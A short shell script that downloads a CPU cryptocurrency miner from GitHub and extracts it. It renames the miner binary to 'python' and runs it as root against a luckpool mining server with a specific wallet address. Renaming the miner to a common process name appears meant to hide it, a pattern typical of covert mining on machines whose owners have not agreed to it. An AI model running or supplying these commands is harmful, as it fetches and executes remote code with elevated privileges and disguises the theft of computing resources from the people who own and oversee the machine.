wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar -xf hellminer_cpu_linux.tar.gz
mv hellminer python
sudo ./python -c stratum+tcp://na.luckpool.net:3956#xnsub -u RKkLHBc3WV9w3cJ8tQuEy7NcLKdSuVFzUP.Rig001 -p x --cpu 4
